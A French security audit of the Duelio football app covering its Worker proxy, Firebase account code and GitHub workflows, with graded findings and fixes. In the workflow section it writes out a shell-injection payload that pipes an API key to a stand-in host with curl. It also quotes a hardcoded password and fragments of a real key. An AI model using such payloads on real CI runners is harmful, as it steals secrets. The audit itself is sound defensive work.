# Relecture sécurité — Duelio

Date : 30 octobre 2026. Périmètre relu intégralement : `www/index.html` (9 845 lignes), `www/compte.js`, `www/legal/legal.js` (+ les trois pages légales et `credits.html`), `worker/duelio-proxy-worker.js`, `relais/serveur.js` (+ `relais/cloud-init.yaml`), les 25 workflows de `.github/workflows/`, `www/_headers`, `www/sw.js`, `www/firebase-config.json`, `CONFIGURATION.md`, `diagnostics/`.

Méthode : lecture du code, grep systématique des puits d'injection (`innerHTML`, `outerHTML`, attributs `src`/`href`/`data-*`/`style`, gabarits `${…}`), suivi des sources (API, fichiers JSON, localStorage, Firestore, URL, saisie) jusqu'à l'affichage, lecture complète du Worker et du relais, et des blocs `run:` des workflows. Les numéros de ligne renvoient aux fichiers tels qu'ils sont dans le dépôt. Aucun fichier du dépôt n'a été modifié.

## Résumé

| # | Gravité | Où | Problème |
|---|---|---|---|
| 1 | **Important** | Worker, routes proxy et `/pack` | Proxy ouvert à tous sans aucune limite par origine ni par client : n'importe qui peut consommer le quota payant d'API-Football (75 000 appels/jour). |
| 2 | **Important** | Worker `/diag` | Page publique qui déclenche un vrai appel API hors limiteur à chaque visite et révèle 8 caractères de la clé, le nom du titulaire, l'e-mail masqué, l'abonnement, le quota et l'adresse du relais. Sa sortie est de plus commitée dans le dépôt. |
| 3 | **Important** | Worker `/auth/*`, `/favorites` | Système de comptes D1 + Resend mort (l'appli utilise Firebase), mais toujours routé publiquement : envoi d'e-mails à une adresse arbitraire, énumération d'adresses, fuite des messages d'erreur Resend. |
| 4 | **Important** (si `INDEX_BUILD_KEY` absent) | Worker `/index/build` | Déclenchement public d'une étape de construction : jusqu'à 20 appels API par visite. La clé est documentée comme « facultative ». |
| 5 | Mineur | Workflows `ajouter-joueur.yml`, `image-apercu.yml` | `inputs` interpolés directement dans un `run:` shell. |
| 6 | Mineur | Workflow `image-apercu.yml` | Nom de joueur (donnée API) injecté sans échappement dans le gabarit HTML de l'image de partage. |
| 7 | Mineur | `index.html` recherche | Taper `__proto__` ou `constructor` dans la recherche fait planter le gestionnaire de saisie (clé non filtrée dans le cache des recherches). |
| 8 | Mineur | `compte.js` | Suppression de compte : les données Firestore sont effacées avant que la suppression du compte Auth soit garantie. Règles Firestore absentes du dépôt. |
| 9 | Mineur | Workflow `sonde-proxy.yml`, `android.yml` | Création de comptes de test en production avec un mot de passe en dur ; publication de `/diag` dans le dépôt ; `android.yml` sans bloc `permissions`. |

**Injections HTML/JS côté client : aucune faille exploitable trouvée.** Tous les champs issus de l'API, des fichiers JSON, de Firestore et de localStorage qui aboutissent dans `innerHTML` passent par `escapeHtml` ; les URL d'images passent par `urlSure`. Le détail (et les quelques endroits non échappés mais non contrôlables par un tiers) est en section 1.

---

## 1. Injections HTML/JS (`www/index.html`)

### 1.1 Ce qui a été vérifié

- `escapeHtml` (l. 2082) échappe `& < > " '` ; il est appliqué sur chaque insertion de : nom de joueur (`p.name`, `shortName(p)`), club (`p.club`, `st.teamName`), nationalité (`nat.name`, y compris le repli « nom tel quel » de `nationFromApiName` l. 3265), noms de compétitions (`nomCompetitionFr(...)` l. 8821, 8897 — la fonction renvoie le nom brut quand aucune règle ne matche, et il est bien échappé), pays (`paysFr`), clubs des transferts (l. 9148–9150), e-mail et duels Firestore (l. 7103–7107), messages d'erreur (`seasonPickError`, `tutoStatus.msg`, l. 9183).
- 37 affectations `innerHTML` et 1 `outerHTML` (l. 2151) relues une à une. Les gabarits non échappés contiennent soit des constantes (`r.label` des tables `STATS_*`/`TROPHIES`/`BROWSE_STAT_GROUPS`, `SUGGESTED_DUELS`, `SLOT_COLORS`, textes des tutoriels), soit des nombres (`seasonLabel`, `fmtNombre`, `ecartPct`, `p.height` qui sort de `parseInt`).
- Attributs : `src` des portraits et logos → `escapeHtml(urlSure(...))` (l. 2145, 2178) ; `urlSure` (l. 2088) n'accepte que `http(s)://` et `data:image/`. `onerror="handlePhotoError(this, ${Number(p.id)||0})"` (l. 2145) : coercition numérique. Aucun `href` dynamique dans `index.html` ; les seuls liens sont statiques (`/legal/...`, `mailto:`).
- `decodeApiText` (l. 2089) décode `&apos; &quot; &#39; &amp;` **à l'entrée**, puis `escapeHtml` ré-échappe à la sortie : ordre correct, pas de double décodage exploitable.
- Pas d'`eval`, de `new Function`, de `setTimeout` avec chaîne, de `document.write`, d'`insertAdjacentHTML`, de `srcdoc`. Aucune lecture de `location`/`hash`/`search` dans `index.html` → pas d'open redirect ni d'injection par l'URL. `legal.js` lit `location.hash` mais n'accepte que `fr`/`en` (l. 15–16).
- Messages affichés via `textContent` : statuts de recherche (`setPickerStatus` l. 8504, `setBrowseStatus` l. 9417), `Compte.messageErreur` (l. 7073, 7175), sous-titre de la feuille de saisons (l. 6870).
- Textes des erreurs API (`apiErrorMessage` renvoie le texte brut de l'API en dernier recours, l. 2690) : toujours affichés par `textContent` ou échappés.
- Pollution de prototype via le JSON de l'API : les clés dérivées de l'API (`parComp[cle]` l. 3433, `comps[cle]` l. 3441) ne touchent que des objets locaux ; `index.set(j.i, j)` utilise une `Map`. Pas de fusion récursive. Côté Worker, `h.parSite[host]` (l. 382) avec `Origin: __proto__` ne pollue rien (affectation d'une primitive à `__proto__`, ignorée).

### 1.2 Insertions non échappées, mais non contrôlables par un tiers aujourd'hui

À connaître si les sources changent ; pas de scénario d'exploitation actuel.

| Ligne | Extrait | Source réelle | Pourquoi non exploitable |
|---|---|---|---|
| 6080, 9302 | `<div class="pos-lbl">${p.posLabel}</div>` | `POS_LABEL[...]` (constantes) ou **localStorage** (`fromStoredLight` l. 5104–5105 et `loadRecentPlayers` l. 5163–5178 rechargent l'objet entier) | localStorage n'est accessible qu'à l'origine `duelio-app.bensouna-ahmed.workers.dev` ; il faudrait déjà une XSS sur cette origine. |
| 6682, 6773, 6801, 8580, 8687 | `data-value="${it.value}"`, `data-season-pick="${p.id}"`, `data-id="${p.id}"` | `player.id` / `league.id` de l'API ou de l'index statique | Identifiants numériques dans l'API ; un identifiant contenant `"` casserait l'attribut. |
| 2172, 6767 | `${p.span[0]}–${p.span[1]}`, `seasonLabel(s[0])` | `www/data/legendes.json` (saisi à la main, dans le dépôt) | Fichier contrôlé par le dépôt. |
| 6684 | `${it.meta||''}` | constantes (l. 6454) | — |
| 6599–6600 | `${st.title}`, `${st.text}`, `${st.art}` | constantes des tutoriels | — |

Rappel de contexte : la page n'a pas de CSP (`_headers` ne pose que cache et CORS) et utilise des gestionnaires inline (`onerror=`), donc une XSS, si elle apparaissait, ne serait freinée par rien. Ce n'est pas une faille en soi, c'est l'absence de filet.

### 1.3 Mineur — plantage de la recherche sur `__proto__` / `constructor`

- `index.html` l. 5122–5127 :
  ```js
  function getCachedSearch(q){
    const c = readQCache()[q];
    if(!c || (Date.now()-c.t) > QCACHE_TTL) return null;
    const out = c.list.map(fromStoredLight); ...
  ```
  `readQCache()` renvoie un objet issu de `JSON.parse` (l. 5114). Pour `q = "__proto__"`, `c` vaut `Object.prototype` (truthy), `c.t` est `undefined` → `NaN > TTL` est faux → `c.list.map` lève `TypeError`. Pour `q = "constructor"`, `c` vaut `Object` → même chute.
- Appelants : l. 8532 (sélecteur) et l. 9467 (écran Joueurs), sans `try/catch`, dans le gestionnaire `input`. La saisie « __proto__ » (≥ 4 caractères, donc le chemin API est atteint) interrompt le gestionnaire : la liste n'est plus mise à jour tant que l'utilisateur ne modifie pas sa saisie. `setCachedSearch("__proto__", …)` (l. 5153) remplace en outre le prototype de `_qcache` par l'entrée.
- Impact : auto-DoS de l'utilisateur seul, aucune escalade. Gravité mineure.

---

## 2. Secrets et données personnelles

### 2.1 Secrets en dur — aucun, mais une fuite partielle commitée

- Aucune clé API-Football, Resend, Firebase ni jeton dans le code ou les workflows. Les secrets passent par `${{ secrets.* }}` dans `env:` (jamais en argument de commande) ; `test-api.yml` l. 20 n'imprime que la longueur de la clé ; `set -x` (`image-apercu.yml` l. 207) n'est activé que dans l'étape `git` sans secret. `firebase-config.json` est vide (`{}`).
- Le jeton Cloudflare Web Analytics (`index.html` l. 56) et les URL des Workers sont publics par nature.
- **Mineur** — `diagnostics/sonde-proxy.txt` l. 2 (commité par `sonde-proxy.yml` l. 41–47) contient la sortie de `/diag` :
  `"cleUtiliseeParCeWorker":"d0ca…4fda (32 caractères)"`, `"compte":"Ahmed Bensouna"`, `"email":"be***@hotmail.com"`, `"abonnement":"Ultra"`, `"finAbonnement":…`, `"requetesAujourdHui":15291`. Les 4 premiers et 4 derniers caractères de la clé (8/32) réduisent l'espace de recherche et suffisent à identifier la clé auprès du support (c'est exactement l'identifiant que `relais/MESSAGE-SUPPORT.md` demande d'envoyer). Voir aussi §4.2.
- L'adresse `bensouna.ahmed@hotmail.com` figure dans `index.html` l. 1746 et les pages légales : mention légale volontaire, pas un problème.

### 2.2 Ce qui est écrit dans localStorage (`index.html`)

Toutes les lectures sont dans `try/catch` + `JSON.parse` défensif. Clés : `duelio_season_v2:<id>:<saison>` (réponses API par saison, l. 3679–3701), `duelio_index_v2` (index court, l. 4761/4818), `duelio_qcache_v1` (recherches → fiches légères, l. 5099), `duelio_recent_v1` (**objet joueur complet** moins `rawBySeason`, l. 5179–5188), `duelio_roster_*`, `duelio_career2_<id>` (transferts + palmarès), `duelio_pinned_*`, `duelio_extra_*`, `duelio_tuto_vu`, `duelio_notifs`, `duelio_duels_vus`, `duelio_share_style`, `duelio_welcomed`, et `duelio_legal_lang` (legal.js). Aucune donnée personnelle de l'utilisateur ; seuls des choix d'interface et des données publiques de joueurs. Le compte Firebase ne stocke rien en localStorage côté appli (le SDK gère sa propre persistance IndexedDB).

### 2.3 Ce qui part vers le proxy et vers Firebase

- Vers le Worker : identifiants de joueurs, saisons, chaînes de recherche (`players/profiles?search=` l. 3641). Le Worker journalise l'`Origin`/`Referer` et le chemin par heure dans KV (`noteUsage` l. 372–388) et republie ce journal publiquement sur `/diag/usage` (l. 708–716) : on y lit quels hôtes appellent le proxy et à quelle fréquence. Aucune IP n'est journalisée.
- Vers Firebase (`compte.js`) : e-mail + mot de passe (Auth), puis `users/{uid} = { email, createdAt }` (l. 77) et `users/{uid}/duels/{id} = { name, playerIds, createdAt }` (l. 115). `name` est construit côté client (`shortName(a) vs shortName(b)`, `index.html` l. 7070). Conforme à ce que la politique de confidentialité annonce.

---

## 3. Firebase (`www/compte.js`)

- **Règles Firestore absentes du dépôt.** Elles n'existent que sous forme de commentaire (l. 12–20) : `match /users/{uid}/{document=**} { allow read, write: if request.auth != null && request.auth.uid == uid; }`. Rien ne permet de vérifier ce qui est réellement déployé ni d'empêcher une dérive. Le code client ne lit jamais les documents d'un autre utilisateur, donc, si cette règle est bien en place, l'isolation est correcte. Pas de validation de schéma dans la règle (un client peut écrire n'importe quel champ dans son propre espace, sans conséquence pour les autres).
- **Mineur — ordre de la suppression de compte** (l. 119–134) :
  ```js
  const snap = await fs.getDocs(col(u.uid));
  await Promise.all(snap.docs.map(d => fs.deleteDoc(d.ref)));
  try{ await fs.deleteDoc(fs.doc(db, 'users', u.uid)); }catch(e){}
  try{ await auth.deleteUser(u); } catch(e){ if(/requires-recent-login/.test(e.code||'')) throw new Error('Par sécurité, reconnecte-toi…'); throw e; }
  ```
  La ré-authentification n'est tentée que pour les comptes mot de passe **et** si `mdp` est fourni (l. 123). Pour un compte Google/Apple, ou si le champ est vide, Firebase peut refuser `deleteUser` (`requires-recent-login`) **après** que tous les duels et le document utilisateur ont été effacés : l'utilisateur garde un compte vide qu'il croit supprimé, et perd ses données même s'il renonce. Scénario : utilisateur Google connecté depuis longtemps → « Supprimer définitivement » → données effacées, compte conservé, message « reconnecte-toi ». Pas d'escalade de privilège, perte de données.
- Gestion des erreurs d'auth : correcte. `messageErreur` (l. 139–157) traduit les codes connus et masque les messages contenant « firebase » ; les messages sont posés par `textContent`. Pas d'oracle supplémentaire par rapport à ce que Firebase expose lui-même (`auth/email-already-in-use` à l'inscription révèle l'existence d'un compte, comportement standard de Firebase).
- Note : `window.__firebaseSimule` (l. 44) est un crochet de test laissé en production : un script déjà exécuté sur la page peut substituer l'implémentation Firebase. Sans XSS préalable, inexploitable ; à retirer du bundle de production.

---

## 4. Proxy Cloudflare Worker et relais

### 4.1 Important — proxy ouvert : n'importe qui peut pomper le quota API-Football

- `worker/duelio-proxy-worker.js` l. 776–781 :
  ```js
  if (!ALLOWED_ENDPOINTS.some(e => path === e || path.startsWith(e + '/'))) return json({ error: 'Endpoint non autorisé.' }, 403);
  const r = await apiCached(env, ctx, request, path, url.search, url.searchParams);
  ```
  et `/pack` l. 494–540. La seule protection est la liste blanche de chemins. **Aucune** vérification d'`Origin`/`Referer` (l'en-tête n'est que journalisé, l. 377), aucune limite par IP ou par client, CORS `*` (l. 52). Le limiteur (`acquireSlot`, l. 209–232) est **par isolate** (`bucket` global, l. 179 ; le commentaire l. 175 le reconnaît) : il protège la clé contre le pare-feu d'API-Football, pas le quota contre un tiers.
- Scénarios vérifiés dans le code :
  - `GET /players/profiles?search=<aléatoire>` : chaque chaîne distincte est un cache MISS (clé de cache = chemin + paramètres normalisés, l. 255–263) → 1 appel API par requête.
  - `GET /pack?id=<N>&career=1` : 1 appel `players/seasons` + jusqu'à `PACK_MAX_SEASONS = 24` appels `players` en parallèle (l. 509, 515–518) → 25 appels API par requête pour tout identifiant jamais demandé (API-Football compte des centaines de milliers d'identifiants).
  - Budget relevé dans `/diag` (fichier `diagnostics/sonde-proxy.txt`) : 75 000 requêtes/jour, 450/min. Un seul isolate laisse passer 360/min (l. 204, marge 0,8) soit ~518 000/jour ; le quota journalier tombe en moins de quatre heures depuis une seule région, bien plus vite depuis plusieurs.
- Impact : indisponibilité des données pour tous les utilisateurs (l'appli bascule en « Mode démonstration », `index.html` l. 9829), et coût si l'abonnement facture le dépassement. Le relais (§4.5) ne change rien : il transmet tout ce que le Worker lui envoie.
- Vérifié non exploitable : le contournement de la liste blanche par `players/../odds` ou `players/%2e%2e/odds` est neutralisé par `new URL()` (segments `..` et `%2e%2e` normalisés avant le test, l. 549–550). `players/..%2fodds` passe le test côté Worker mais arrive tel quel chez API-Football, qui ne le reconnaît pas comme un chemin valide ; sans effet utile.

### 4.2 Important — `/diag` : page publique, appel API hors limiteur, fuite d'informations

- l. 717–772. Aucune authentification (`if (path === 'diag')`). À chaque visite :
  - `const r = await callApi(env, 'status');` (l. 739) : appel direct à API-Football **sans** `acquireSlot` ni cache → 1 appel de quota par visite, en boucle libre. Contrairement au reste du proxy, ce chemin ignore même le limiteur anti-pare-feu : une rafale fait bloquer la clé par API-Football (le code lui-même documente ce blocage, l. 767).
  - l. 718–725 : `cleUtiliseeParCeWorker: `${key.slice(0, 4)}…${key.slice(-4)} (${key.length} caractères)`` → 8 caractères de la clé et sa longueur.
  - l. 721 : `RELAIS à IP dédiée → ${env.RELAY_URL}` → adresse publique du relais (voir §4.5).
  - l. 747–759 : nom complet du titulaire du compte API-Football (**non masqué**), e-mail masqué (`be***@hotmail.com`), plan, date de fin, requêtes du jour et limite.
- `CONFIGURATION.md` §5 présente ces pages comme outil d'exploitation ; `sonde-proxy.yml` l. 28 les publie dans le dépôt.
- Même constat, moindre, pour `/diag/usage` (l. 708–716) : journal public des hôtes appelants et des volumes horaires ; l'`Origin` qui y est stocké est une chaîne arbitraire fournie par le client.

### 4.3 Important (conditionnel) — `/index/build` sans clé

- l. 696–703 :
  ```js
  if (env.INDEX_BUILD_KEY && url.searchParams.get('key') !== env.INDEX_BUILD_KEY) return json({ error: 'Clé requise.' }, 403);
  const step = await buildIndexStep(env);
  ```
  Si `INDEX_BUILD_KEY` n'est pas définie — `CONFIGURATION.md` l. 25 la qualifie de « facultatif » — la route est publique. `buildIndexStep` enchaîne jusqu'à `INDEX_PAGES_PER_RUN = 20` appels `players?league=…&page=…` (l. 41, 308–333) via `apiGet`, lui aussi hors `acquireSlot`. Des appels concurrents lisent le même `doc.build` et refont chacun les 20 pages. Si la ligue la plus ancienne a moins de 24 h, la fonction sort sans appel (l. 300–302) ; l'abus n'est donc possible que pendant les fenêtres de reconstruction, mais il suffit d'attendre.

### 4.4 Important — API de comptes D1/Resend morte mais exposée

- `index.html` ne contient aucune référence à `/auth/`, `/favorites` ni à un en-tête `Authorization` (grep négatif) : les comptes passent par Firebase (`compte.js`). Les routes du Worker l. 557–663 sont donc du code mort **servi en production** (confirmé par `diagnostics/sonde-proxy.txt` : `/auth/me` → 401, `/auth/login` → 401, `/auth/register` e-mail invalide → 400).
- `POST /auth/register` (l. 558–582) : pour tout e-mail syntaxiquement valide, `sendVerificationEmail` (l. 94–119) envoie un courriel via Resend à l'adresse fournie, sans limite de débit ni CAPTCHA → bombardement d'une victime et épuisement du quota/réputation Resend. Réponse 409 « Un compte existe déjà » (l. 564) → énumération des adresses inscrites. En cas d'échec Resend, le texte brut de l'erreur Resend est renvoyé au client (l. 116–117, 579).
- `POST /auth/login` (l. 600–614) : PBKDF2 100 000 itérations par tentative sans limite → force brute possible et CPU du Worker consommé à chaque appel.
- État observé : l'inscription avec un e-mail valide a répondu `HTTP 500 error code: 1101` (exception non rattrapée du Worker, cohérent avec une liaison `DB` absente : `env.DB.prepare` sur `undefined`, l. 563). Le système est donc probablement cassé plutôt qu'actif, mais il suffit de lier une base D1 pour que tout ce qui précède devienne opérationnel, et `CONFIGURATION.md` §1 et §2 invite à le faire. Le schéma SQL n'est pas dans le dépôt.
- Remarque : `verify_token` et jetons de session sont tirés de `crypto.getRandomValues` (32 octets), les requêtes SQL sont paramétrées, le mot de passe est salé : la cryptographie de ce bloc est correcte ; le problème est son exposition sans usage.

### 4.5 Relais (`relais/serveur.js`) — conforme, deux remarques mineures

- Accepte uniquement `GET` (l. 33), exige `x-duelio-secret` (l. 34), applique la même liste blanche de chemins (l. 35), transmet la query telle quelle (l. 42). La clé n'est jamais renvoyée ; seuls le corps et les en-têtes de quota d'API-Football sont relayés (l. 45–49). HTTPS via Caddy (`cloud-init.yaml` l. 107–111), service sous `nobody`, fichier d'environnement en 0600.
- Mineur : `/sante` et `/` (l. 32) sont publics et exposent les compteurs d'appels/refus par heure ; l'adresse du relais étant révélée par `/diag` (§4.2), un tiers peut cibler le relais directement (sans secret, il n'obtient que des 403, mais le compteur `refuses` et la machine encaissent le trafic).
- Mineur : comparaison du secret par `!==` (l. 34), non constante en temps ; à 32 octets aléatoires, inexploitable en pratique.

---

## 5. Workflows GitHub

Tous se déclenchent par `workflow_dispatch` (deux ont aussi un `schedule`) : seuls les collaborateurs avec droit d'écriture peuvent les lancer et fournir des `inputs`. Aucun `pull_request_target`, `issue_comment` ni autre entrée non fiable. Cela borne la gravité de ce qui suit.

- **Mineur — injection shell par `inputs`**
  - `ajouter-joueur.yml` l. 79 : `git commit -m "Ajout du joueur ${{ github.event.inputs.id }}" || echo rien` — `id` est une chaîne libre (l. 10–13), développée par GitHub **avant** que le shell ne la lise : `"; curl -d @- http://x <<< "$API_FOOTBALL_KEY` s'exécute. La clé est présente dans l'`env:` de l'étape précédente seulement, mais le même runner garde le dépôt et le `GITHUB_TOKEN` (`contents: write`).
  - `image-apercu.yml` l. 215 : `git commit -m "Image d'apercu : ${{ inputs.joueur_gauche || '874' }} contre ${{ inputs.joueur_droite || '154' }}"` — même motif.
  - Les autres workflows passent correctement les `inputs` par `env:` (`ID`, `NOM`, `JOUEURS`, …) et les lisent via `process.env`.
  - Impact : un collaborateur ayant déjà le droit d'écriture peut exécuter du shell sur le runner ; pas d'escalade au-delà de ses droits, mais le motif est à corriger car il survit à un durcissement des branches protégées.
- **Mineur — HTML non échappé dans l'image de partage** (`image-apercu.yml` l. 182–188) :
  ```js
  .replace("__NOM_A__", j[0].nom).replace("__NOM_B__", j[1].nom)
  ```
  `nom` provient de `www/data/full/<id>.json` → champ `n` écrit depuis `profil.name` d'API-Football (`ajouter-joueur.yml` l. 47). Le gabarit est rendu par Chromium headless et capturé dans `www/og-image.png`, commité puis servi à tous les partages. Un nom contenant du HTML déforme l'image publique ; `.replace` avec une chaîne interprète aussi `$&`, `$'`. Les identifiants `GAUCHE`/`DROITE` (l. 60, 128) servent de chemin de fichier sans validation (`www/data/full/${id}.json`) : lecture arbitraire par le lanceur du workflow seulement.
- **Mineur — `sonde-proxy.yml`** : l. 37 inscrit un compte réel sur le Worker de production avec le mot de passe en dur `SondeDuelio2026!` et l'adresse `email_test` insérée sans échappement dans un corps JSON ; l. 41–47 commite la sortie de `/diag` (voir §2.1).
- **Mineur — `android.yml`** : seul workflow sans bloc `permissions:` (les 24 autres fixent `contents: read` ou `write`) ; il hérite des permissions par défaut du dépôt. Il n'utilise pas `GITHUB_TOKEN` et ne pousse rien ; `GOOGLE_SERVICES_JSON` est écrit dans l'APK de debug publié en artefact, ce qui est son usage normal (le fichier est public dans toute APK).
- 20 workflows ont `contents: write` et poussent directement sur `main` (`git pull --rebase && git push`). C'est leur fonction (moisson de données) ; rien d'anormal dans le code, mais c'est 20 points d'écriture sur la branche de production dont la sécurité repose entièrement sur qui peut les lancer.
- Secrets dans les logs : rien trouvé. Pas d'`echo` de variable secrète, pas de `curl -v`, pas de `console.log` d'en-têtes.

---

## 6. Autres points vérifiés

- `www/sw.js` (service worker avec cache « coquille » et « données ») est encore dans le dépôt et servi, mais `index.html` l. 190–199 désinscrit tout service worker. Fichier mort ; aucun risque tant qu'il n'est pas ré-enregistré.
- `www/legal/credits.html` l. 70–72 : `href="' + esc(c.page) + '"` à partir de `data/legendes-credits.json` — échappé mais sans filtre de schéma ; source = dépôt, non exploitable.
- CORS : `Access-Control-Allow-Origin: *` sur `/data/*` (`_headers`) et sur toutes les réponses du Worker. Les données sont publiques et aucun cookie n'est utilisé (`Bearer` seulement dans l'API morte) : pas de fuite inter-origine.
- Cache du Worker : les réponses en erreur (HTTP ≠ 2xx ou `errors` non vide) sont `no-store` (l. 469, 479) ; pas d'empoisonnement de cache par réponse d'erreur. La clé de cache ignore `_ t ts n v r cb nocache rand` (l. 254) : cohérent.
- `compte.js` : SDK chargé depuis `gstatic.com` sans SRI (pratique standard pour Firebase, les modules ESM ne supportant pas la vérification d'intégrité par sous-ressource de manière fiable).

---

## Ce qu'il faudrait corriger en priorité (déduit des constats, sans généralité)

1. Retirer du Worker les routes `/auth/*` et `/favorites` (code mort, §4.4), ou au minimum ne plus les router.
2. Mettre `/diag`, `/diag/usage` et `/index/build` derrière une clé obligatoire (ou les supprimer), et retirer `diagnostics/sonde-proxy.txt` du dépôt puis régénérer la clé API-Football dont 8 caractères sont publics (§4.2, §2.1).
3. Donner au proxy une limite par client (IP via `request.headers.get('CF-Connecting-IP')`, ou jeton d'appli) et plafonner `/pack?career=1` pour les identifiants jamais vus (§4.1).
4. Dans `ajouter-joueur.yml` l. 79 et `image-apercu.yml` l. 215, passer les `inputs` par `env:` comme le font les autres workflows (§5) ; échapper `nom` dans `image-apercu.yml` l. 182–185.
5. `compte.js` : exiger une ré-authentification réussie (mot de passe ou fournisseur) **avant** d'effacer les documents Firestore (§3) ; versionner `firestore.rules`.
6. `index.html` l. 5123 : `Object.prototype.hasOwnProperty.call(cache, q)` avant de lire l'entrée (§1.3).
